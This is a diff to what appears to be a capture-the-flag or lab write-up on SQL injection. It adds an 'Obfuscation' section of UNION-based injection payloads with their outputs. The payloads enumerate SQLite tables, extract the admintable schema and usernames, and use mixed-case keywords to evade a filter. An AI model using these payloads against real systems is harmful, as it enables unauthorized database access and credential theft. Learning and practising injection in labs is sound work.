@@ -137,6 +137,42 @@ select
 
 Reponse: _Ahh there is a word in there I don't like :(_
 
+
+
+3. _Obfuscation_
+
+```sql
+' Union Select * from users '=
+' Union Select name from sqlite_master where type = 'table' '=
+
+--**
+' Union Select name from sqlite_master where type = 'table' OR '=
+--OUTPUT: Password: admintable
+
+
+--**
+' Union Select * from admintable '=
+--OUTPUT: Error: SELECTs to the left and right of UNION do not have the same number of result columns
+' AND '1=0' Union Select * from admintable '=
+--OUTPUT: Error: SELECTs to the left and right of UNION do not have the same number of result columns
+
+
+--** TRYING TO GET COLUMN NAMES OF THE TABLE 'admintable'
+-- ** NOTICE the different cases of the letters other than: UNION, union
+' Union SELECt sql FROM sqlite_master WHERE type = 'table' AND name = 'users' OR '=
+--OUTPUT: 
+/*
+Password: CREATE TABLE admintable (
+                   id INTEGER PRIMARY KEY,
+                   username TEXT,
+                   password INTEGER)
+*/
+
+--**
+' Union SELECt username from 'admintable' or '=
+
+```
+
 <pre class="language-sql"><code class="lang-sql">-- 1)
 --INPUT: ' OR 1=1 
 -- Error: unrecognized token:  "' LIMIT 30" 
